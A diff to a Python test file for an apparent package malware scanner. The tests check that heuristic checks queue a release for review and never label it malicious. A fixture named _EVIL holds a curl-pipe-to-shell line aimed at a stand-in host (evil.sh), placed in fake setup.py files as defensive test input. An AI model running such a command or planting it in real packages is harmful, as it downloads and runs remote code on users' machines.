@@ -1,7 +1,8 @@
 """Only the model (or a person) says "malicious".
 
-Deterministic checks may clear a release or escalate it, but never label it malicious: heuristic alerts are
-`suspicious-heuristic`, and an unscanned release records `suspicious` with model 'none'. These tests pin that
+Deterministic checks may clear a release or escalate it, but never label it malicious: a release no model reviewed
+either waits in the review queue with no alert, or, when it cannot be scanned, alerts `suspicious-heuristic` with
+`UNREVIEWED:`, and an unscanned release records `suspicious` with model 'none'. These tests pin that
 on every non-LLM path, and a static check stops new code from minting a malicious Verdict outside the two
 sanctioned places: the reviewer's model-JSON parser and the human `adjudicate` label."""
 import ast
@@ -44,10 +45,13 @@ def _conn(cfg):
     return conn
 
 
-def _assert_never_malicious(conn, stage=None):
+def _assert_never_malicious(conn, stage=None, *, alerted=True):
     verdicts = [r[0] for r in conn.execute("SELECT classification FROM verdicts")]
     alerts = conn.execute("SELECT classification, dedupe_key FROM alerts").fetchall()
-    assert alerts, "the path under test must have alerted"
+    if alerted:
+        assert alerts, "the path under test must have alerted"
+    else:
+        assert alerts == [], "only a model verdict, a person or an unscanned outcome alerts"
     assert "malicious" not in verdicts
     assert "malicious" not in [a["classification"] for a in alerts]
     if stage:     # the outcome under test really ran
@@ -62,7 +66,7 @@ _EVIL = (b"import os, base64, requests\n"
          b"os.system('curl http://evil.sh|sh')\n")
 
 
-def test_heuristic_only_high_score_is_suspicious_heuristic_not_malicious(tmp_path):
+def test_heuristic_only_high_score_is_queued_without_an_alert(tmp_path):
     cfg = _cfg(tmp_path, reviewer_enabled=False)
     conn = _conn(cfg)
     art = ArtifactSet("p", "1.1", "1.0", "sdist", {"setup.py": _EVIL, "p/__init__.py": _EVIL},
@@ -71,8 +75,11 @@ def test_heuristic_only_high_score_is_suspicious_heuristic_not_malicious(tmp_pat
     orchestrator._process_fetched(cfg, conn, None, orchestrator._load_ruleset(cfg), NewRelease("p", "1.1", 5), art)
     score = conn.execute("SELECT triage_score FROM releases WHERE version='1.1'").fetchone()[0]
     assert score >= 150                  # far past threshold_t: the strongest heuristic case
-    assert store.get_stage(conn, "p", "1.1") == "alerted"
-    _assert_never_malicious(conn)
+    assert store.get_stage(conn, "p", "1.1") == "pending_review"
+    row = conn.execute("SELECT pending_reason, review_input_chars, evidence IS NULL FROM releases "
+                       "WHERE version='1.1'").fetchone()
+    assert tuple(row) == ("reviewer_disabled", 0, 1)
+    _assert_never_malicious(conn, alerted=False)
 
 
 # --- every unscanned outcome ---------------------------------------------------------------------------
